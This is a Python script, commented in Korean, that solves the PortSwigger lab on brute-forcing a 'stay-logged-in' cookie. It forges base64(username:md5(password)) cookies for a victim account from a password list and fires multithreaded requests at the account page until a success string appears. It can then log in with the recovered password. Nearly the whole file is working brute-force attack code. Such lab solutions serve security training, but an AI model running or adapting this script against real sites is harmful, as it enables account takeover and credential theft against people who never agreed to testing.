#!/usr/bin/env python3
"""
Authentication - Brute-forcing a stay-logged-in cookie
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

취약점:
  "stay-logged-in" 쿠키가 base64(username + ":" + md5(password)) 형식이며
  서버가 이를 검증 없이 신뢰한다.
  → 후보 password 마다 쿠키를 만들어 요청하면 유효 쿠키를 찾을 수 있다.

흐름:
  1) (선택) 자기 계정 쿠키로 형식을 검증
  2) 후보 password 마다 base64(victim:md5(pw)) 쿠키로 GET /my-account?id=victim
  3) 성공 시그니처(기본 "Update email")가 보이면 발견
  4) 필요 시 찾은 자격증명으로 로그인 검증

사용 예시:
  python3 14-authentication-stay-logged-in-cookie.py \\
    --target "https://LAB-ID.web-security-academy.net" \\
    --victim carlos --verify
"""

import argparse
import base64
import hashlib
import importlib.util
import os
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_HERE = os.path.dirname(os.path.abspath(__file__))
_BF_PATH = os.path.join(_HERE, "14-authentication-brute-force.py")

TIMEOUT = 15


def _load_bruteforce():
    spec = importlib.util.spec_from_file_location("auth_bruteforce", _BF_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


bf = _load_bruteforce()


def build_cookie(username: str, password: str) -> str:
    """base64(username + ':' + md5(password)) 생성."""
    md5 = hashlib.md5(password.encode()).hexdigest()
    raw = f"{username}:{md5}".encode()
    return base64.b64encode(raw).decode()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="stay-logged-in 쿠키 brute-force"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--victim", default="carlos",
                        help="공격 대상 username (기본: carlos)")
    parser.add_argument("--passwords", default=None,
                        help=f"password 목록 (URL/파일/인라인). 기본: {bf.DEFAULT_PASSWORDS}")
    parser.add_argument("--cookie-name", default="stay-logged-in",
                        help="유지 로그인 쿠키 이름 (기본: stay-logged-in)")
    parser.add_argument("--account-path", default="/my-account",
                        help="계정 페이지 경로 (기본: /my-account)")
    parser.add_argument("--id-param", default="id",
                        help="계정 페이지의 사용자 파라미터 이름 (기본: id)")
    parser.add_argument("--success-text", default="Update email",
                        help="성공 판별 문자열 (기본: 'Update email')")
    parser.add_argument("--valid-username", default="wiener",
                        help="형식 검증용 자기 계정 username (기본: wiener)")
    parser.add_argument("--valid-password", default="peter",
                        help="형식 검증용 자기 계정 password (기본: peter)")
    parser.add_argument("--no-sanity", action="store_true",
                        help="자기 계정 쿠키 형식 검증 생략")
    parser.add_argument("--threads", type=int, default=10,
                        help="동시 요청 수 (기본: 10)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="요청 간 지연(초) (기본: 0)")
    parser.add_argument("--verify", action="store_true",
                        help="찾은 자격증명으로 로그인 검증")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    account_url = base + args.account_path

    try:
        passwords = bf.load_wordlist(args.passwords, bf.DEFAULT_PASSWORDS)
    except Exception as e:
        print(f"[-] 목록 로딩 실패: {e}")
        sys.exit(1)

    print(f"[*] 대상        : {base}")
    print(f"    victim      : {args.victim}")
    print(f"    쿠키        : {args.cookie_name} = base64(user:md5(pw))")
    print(f"    passwords   : {len(passwords)}개")
    print(f"    성공 시그니처: {args.success_text!r}")

    # 1) 자기 계정 쿠키로 형식 검증
    if not args.no_sanity:
        sanity_cookie = build_cookie(args.valid_username, args.valid_password)
        try:
            r = requests.get(account_url,
                             params={args.id_param: args.valid_username},
                             cookies={args.cookie_name: sanity_cookie},
                             verify=False, timeout=TIMEOUT, allow_redirects=True)
            ok = args.success_text in r.text
            print(f"\n[*] 형식 검증 — {args.valid_username} 쿠키 "
                  f"{'성공' if ok else '실패'} (status={r.status_code})")
            if not ok:
                print("    [!] 형식(해시/인코딩)이나 성공 시그니처가 다를 수 있습니다.")
        except requests.exceptions.RequestException as e:  # noqa: BLE001
            print(f"    형식 검증 요청 실패: {e}")

    # 2) victim 쿠키 brute-force
    print(f"\n[*] brute-force — {args.victim} 의 {args.cookie_name} 쿠키")
    print("    " + "-" * 60)

    found = {"pw": None, "cookie": None}
    lock = threading.Lock()
    stop = threading.Event()
    counter = {"n": 0}

    def try_password(pw: str) -> None:
        if stop.is_set():
            return
        cookie = build_cookie(args.victim, pw)
        try:
            resp = requests.get(account_url,
                                params={args.id_param: args.victim},
                                cookies={args.cookie_name: cookie},
                                verify=False, timeout=TIMEOUT, allow_redirects=True)
        except requests.exceptions.RequestException:
            return
        with lock:
            counter["n"] += 1
            n = counter["n"]
        if args.success_text in resp.text or \
                f"Your username is: {args.victim}" in resp.text:
            with lock:
                if not stop.is_set():
                    stop.set()
                    found["pw"] = pw
                    found["cookie"] = cookie
                    print(f"    [{n}] {pw:<18} → 성공! cookie={cookie}")
        elif n % 25 == 0:
            with lock:
                print(f"    [{n}/{len(passwords)}] 진행 중... (마지막: {pw})")
        if args.delay:
            import time
            time.sleep(args.delay)

    with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
        ex.map(try_password, passwords)

    if not found["pw"]:
        print("\n[-] 유효한 쿠키를 찾지 못했습니다. "
              "형식/시그니처를 확인하거나 --no-sanity 결과를 점검하세요.")
        sys.exit(1)

    print(f"\n[+] {args.victim} / {found['pw']}")
    print(f"    {args.cookie_name}={found['cookie']}")

    # 3) 로그인 검증
    if args.verify:
        print(f"\n[*] 로그인 검증 — POST /login ({args.victim})")
        s = requests.Session()
        s.verify = False
        s.get(base + "/login", timeout=TIMEOUT)
        r = s.post(base + "/login",
                   data={"username": args.victim, "password": found["pw"]},
                   timeout=TIMEOUT, allow_redirects=True)
        logged_in = "log out" in r.text.lower()
        print(f"    status={r.status_code}, 로그아웃 링크={'확인' if logged_in else '없음'}")
        m = __import__("re").search(
            r'(?i)your username is:?\s*(?:<[^>]+>)?\s*([^<\s]+)', r.text)
        if m:
            print(f"[+] 로그인 사용자: {m.group(1)}")
        if logged_in and (not m or m.group(1).lower() == args.victim.lower()):
            print(f"[✓] {args.victim} 계정 로그인 확인")


if __name__ == "__main__":
    main()
